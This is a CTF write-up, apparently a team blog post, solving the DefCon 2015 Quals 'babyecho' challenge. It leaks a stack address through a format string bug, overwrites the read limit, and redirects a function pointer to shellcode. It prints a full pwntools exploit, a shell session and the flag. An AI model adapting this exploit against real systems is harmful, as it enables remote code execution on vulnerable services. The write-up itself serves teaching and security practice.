---
layout: post
title: "DefCon 2015 Quals babyecho"
date: 2015-05-18 12:36:08 -0400
author: [superkojiman,swappage]
comments: true
categories: [defcon]
---

### Solved by superkojiman and Swappage

This was basically an echo server. Send it something, and it echoes it back. Swappage started off working on this while I was probably asleep. He found a format string vulnerability which allowed us to leak information from the stack. However, we were limited to 13 characters only. 

After a bit of time examining it in gdb and IDA, I realized that the 13 character limit was being initialized outside of the loop which received our input and echoed it back. Essentially it looked something like this:

```c
int toread = 13;    // total bytes to read
while (1) { 
    int tmp = 1023; 
    if (toread <= 1023) { 
        tmp = toread; 
    } 
    toread = tmp; 
    ..... 
}
```

What about the information we could leak from the stack? Here's what we could get:

```text
aaaa.%1$x  -> 0xd
aaaa.%2$x  -> 0xa
aaaa.%3$x  -> 0x0
aaaa.%4$x  -> 0xd
aaaa.%5$x  -> stack address; ptr to first char in "aaaa" on the stack 
aaaa.%6$x  -> 0x0
aaaa.%7$x  -> start of our format string "aaaa"
```

0xd is the value 13. The one we were interested in changing was at offset 4. How do we get that address? As it turns, out, we can leak a stack address from offset 5, so we just need to subtract the difference and we'd get the address of toread. In this case, toread was 12 bytes before the leaked stack address So:

```python
r.send("%5$x\n") 
leak = r.recvline()
log.info("Leaked stack address " + leak)

# leaked address is a pointer on the stack that's 12 bytes after 
# the address containing 0xd (toread)
toread = int(leak, 16) - 12
log.info("Address of toread " + hex(toread))
```

Once we had the address of toread, we could modify its value so that we could get the program to read more than 13 characters. Since we know that our format string starts at offset 7, this was easy to change: 

```
buf = ""
buf += p32(toread)
buf += "%99x%7$n"

log.info("Length of payload " + str(len(buf)))
log.info("Overwriting toread stage 1" + hexdump(buf))
r.send(buf + "\n")
print r.recv()
```
This sets toread to 103 bytes, so we have more than enough room for write whatever we want anywhere; question was, what to overwrite? There was no GOT since the binary was statically compiled. After a bit of searching, I found a function pointer 0x80ea9f0 that was called by sub_806CB50. I could overwrite this to point to my shellcode, which would be 30 bytes after the leaked stack address. Easy enough to get that address:

```
payload_addr = int(leak, 16) + 30   # payload is leak + 30
log.info("Payload address " + str(hex(payload_addr)))
```

Since ASLR was most likely enabled on the server, I couldn't just pre-calculate the number of bytes to write to overwrite the function pointer. To simplify things, I just used hellman's [libformatstr](https://github.com/hellman/libformatstr).

```
p = FormatStr()
p[0x80ea9f0] = payload_addr                         # overwrite 0x80ea9f0 with calculated payload address

buf = ""
buf += p.payload(7)                                 # format string at offset 7
buf += "\x90\x90\x90" + asm(shellcraft.linux.sh())  # shellcode padded by 3 bytes to keep it aligned

r.send(buf + "\n")
print r.recv()
```

Here's the final exploit:

```
#!/usr/bin/env python

from pwn import *
from libformatstr import FormatStr

r = remote("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232)


print r.recv()
r.send("%5$x\n") 
leak = r.recvline()
log.info("Leaked stack address " + leak)

# leaked address is a pointer on the stack that's 12 bytes after 
# the address containing 0xd (toread)
toread = int(leak, 16) - 12

log.info("Address of toread " + hex(toread))

buf = ""
buf += p32(toread)
buf += "%99x%7$n"

log.info("Length of payload " + str(len(buf)))
log.info("Overwriting toread " + hexdump(buf))
r.send(buf + "\n")
print r.recv()

log.info("Write what where")
payload_addr = int(leak, 16) + 30   # payload is leak + 30
log.info("Payload address " + str(hex(payload_addr)))

p = FormatStr()
p[0x80ea9f0] = payload_addr    # 0x80ea9f0 is a function pointer

buf = ""
buf += p.payload(7)
buf += "\x90\x90\x90" + asm(shellcraft.linux.sh())

r.send(buf + "\n")
print r.recv()

r.interactive()
```

So it turns out that the exploit I wrote isn't 100% reliable. The first time I ran it locally it worked, but when I tested it on the server it failed. Then I ran it again locally and it failed. As it turns out, trying it several times will eventually lead to a successful run. I didn't look into why this was the case, but probably something on the stack changes and upsets my calculations; who knows? In any case, it will succeed eventually: 

```
koji@pwnbox:$ ./sploit.py 
[+] Opening connection to babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me on port 3232: Done
Reading 13 bytes

[*] Leaked stack address ffaafa3c
[*] Address of toread 0xffaafa30
[*] Length of payload 12
[*] Overwriting toread 00000000  30 fa aa ff  25 39 39 78  25 37 24 6e               │0···│%99x│%7$n││
    0000000c
Reading 13 bytes

[*] Write what where
[*] Payload address 0xffaafa5a
[!] Your local binutils won't be used because architecture 'i686' is not supported.
0���                                                                                                  d
Reading 103 bytes

[*] Switching to interactive mode
.
.
.

                                                                                                                                                                                                                                                   $ whoami
babyecho
$ cat /home/babyecho/flag
The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
```

Got the flag: **1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%**
